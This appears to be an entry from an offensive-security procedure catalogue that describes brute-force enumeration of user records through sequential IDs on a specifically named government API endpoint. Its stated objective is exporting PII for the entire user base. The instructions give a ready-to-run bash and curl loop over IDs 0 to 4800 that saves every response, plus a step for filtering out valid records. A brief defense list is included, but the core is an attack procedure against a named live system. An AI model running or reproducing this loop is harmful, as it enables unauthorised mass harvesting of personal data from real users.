---
id: uuid-brute-id-1
tags:
  - enumeration
  - brute-force
  - idor
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Discovery]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:29:19.868Z'
skill_level: intermediate
impact_level: critical
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Brute-Force User Enumeration via Incremental IDs

## Summary

This procedure systematically enumerates all user data by iterating through sequential IDs in the vulnerable API, leaking PII for the entire user base.

## Description

Leveraging predictable IDs from 0 to 4800 on https://tmss.gsa.gov/tmssserver/api/public/customerregistration/:id/userId/, this scales single-ID access to full disclosure. Requires scripting for efficiency; outcomes full dataset export.

## Requirements

1. Scripting tool (e.g., bash loop with curl)
2. Internet access to target
3. Storage for collected data

## Defense

Defensive measures and detection strategies:

- Randomize user IDs
- Implement API rate limiting
- Monitor for sequential request patterns

## Objectives

1. Collect all user registrations
2. Identify valid vs invalid IDs
3. Export PII for analysis

## Instructions

### Step 1: Script Loop for IDs

**Context**: Automate requests for IDs 0-4800.

Use bash with curl:

```bash
for id in {0..4800}; do curl "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/$id/userId/" >> users.json; done
```

> Appends JSON responses; filter valid ones post-run.

### Step 2: Parse and Validate

**Context**: Extract valid data from responses.

Use jq or grep to filter non-error responses.

> Success if ~4800 valid JSON objects collected.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/curl]]

## Tags

- [[enumeration]]
- [[brute-force]]
- [[idor]]
